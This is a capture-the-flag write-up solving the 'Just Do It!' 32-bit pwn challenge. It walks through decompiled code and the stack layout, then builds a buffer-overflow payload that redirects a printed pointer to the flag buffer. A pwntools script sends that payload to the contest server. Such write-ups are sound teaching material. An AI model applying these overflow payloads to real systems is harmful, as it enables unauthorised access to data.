# Just Do It!

Unfortunately because of a Calc 3 Test, I had to wait untill the Wenesday after the ctf to solve this.

Let's take a look at the binary:
```
$	file just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa 
just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
```

```
$	pwn checksec just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa 
[*] '/Hackery/west/doit/just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

So we can see that it is a 32 bit binary, with a non executable stack. Let's try to run it.

```
$	./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa 
file open error.
: No such file or directory
```

So it is complainning about a file opening error, probably trying to open a file that isn't there. Let's look at the main function in IDA:

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char input; // [sp+8h] [bp-20h]@7
  FILE *stream; // [sp+18h] [bp-10h]@1
  char *output_message; // [sp+1Ch] [bp-Ch]@1

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  output_message = failed_message;
  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    perror("file open error.\n");
    exit(0);
  }
  if ( !fgets(flag, 48, stream) )
  {
    perror("file read error.\n");
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  if ( !fgets(&input, 32, stdin) )
  {
    perror("input error.\n");
    exit(0);
  }
  if ( !strcmp(&input, PASSWORD) )
    output_message = success_message;
  puts(output_message);
  return 0;
}
```

So we can see that the file it is trying to open is `flag.txt`. We can also see that this binary will essentially prompt you for a password,  and if it is the right password it will print in a logged in message. If not it will print an authentication error. Let's see what the value of `PASSWORD` is, so we can know what we need to set our input equal to to pass the check:

```
87C8 aP@ssw0rd       db 'P@SSW0RD',0         ; DATA XREF: .data:PASSWORDo
```

So we can see that the string it is checking for is `P@SSW0RD`.  Now since our input is being scanned in through an fgets call, a newline character `0x0a` will be appended to the end. So in order to pass the check we will need to put a null byte after `P@SSW0RD`.

```
$	python -c 'print "P@SSW0RD" + "\x00"' | ./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa 
Welcome my secret service. Do you know the password?
Input the password.
Correct Password, Welcome!
```

So we passed the check, however that doesn't solve the challenge. We can see that with the fgets call, we can input 32 bytes worth of data into `input`. Let's see how many bytes `input` can hold:
```
-00000020 input           db ?
-0000001F                 db ? ; undefined
-0000001E                 db ? ; undefined
-0000001D                 db ? ; undefined
-0000001C                 db ? ; undefined
-0000001B                 db ? ; undefined
-0000001A                 db ? ; undefined
-00000019                 db ? ; undefined
-00000018                 db ? ; undefined
-00000017                 db ? ; undefined
-00000016                 db ? ; undefined
-00000015                 db ? ; undefined
-00000014                 db ? ; undefined
-00000013                 db ? ; undefined
-00000012                 db ? ; undefined
-00000011                 db ? ; undefined
-00000010 stream          dd ?                    ; offset
-0000000C output_message  dd ?                    ; offset
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004 var_4           dd ?
+00000000  s              db 8 dup(?)
```
 
 So we can see that it can hold 16 bytes worth of data (0x20 - 0x10 = 16). So we effictively have a buffer overflow vulnerabillity with the fgets call to `input`. However it appears that we can't reach the `eip` register to get RCE. However we can reach `output_message` which is printed with a puts call, right before the function returns. So we can print whatever we want. That makes this code look really helpful:

```
  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    perror("file open error.\n");
    exit(0);
  }
  if ( !fgets(flag, 48, stream) )
  {
    perror("file read error.\n");
    exit(0);
  }
```
  
  So we can see here that after it opens the `flag.txt` file, it scans in 48 bytes worth of data into `flag`. This is interesting because if we can find the address of `flag`, then we should be able to overwrite the value of `output_message` with that address and then it should print out the contents of `flag`, which should be the flag.
  
```
  .bss:0804A080 ; char flag[48]
.bss:0804A080 flag            db 30h dup(?)           ; DATA XREF: main+95o
.bss:0804A080 _bss            ends
.bss:0804A080
```
  
  So here we can see that `flag` lives in the bss, with the address `0x0804a080`. There are 20 bytes worth of data between `input` and `output_message` (0x20 - 0x0c = 20). So we can form a payload with 20 null bytes, followed by the address of `flag`:
  
```
  python -c 'print "\x00"*20 + "\x80\xa0\x04\x08"' | ./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa 
Welcome my secret service. Do you know the password?
Input the password.
flag{gottem_boyz}
```

So we were able to read the contents of `flag.txt` with our exploit. Let's write an exploit to use the same exploit against the server they have with the challenge running to get the flag. Here is the python code:

```
#Import pwntools
from pwn import *

#Create the remote connection to the challenge
target = remote('pwn1.chal.ctf.westerns.tokyo', 12482)

#Print out the starting prompt
print target.recvuntil("password.\n")

#Create the payload
payload = "\x00"*20 + p32(0x0804a080)

#Send the payload
target.sendline(payload)

#Drop to an interactive shell, so we can read everything the server prints out
target.interactive()
```

Now let's run it:

```
$	python exploit.py 
[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 12482: Done
Welcome my secret service. Do you know the password?
Input the password.

[*] Switching to interactive mode
TWCTF{pwnable_warmup_I_did_it!}

[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to pwn1.chal.ctf.westerns.tokyo port 12482
```

Just like that, we captured the flag!

 
 
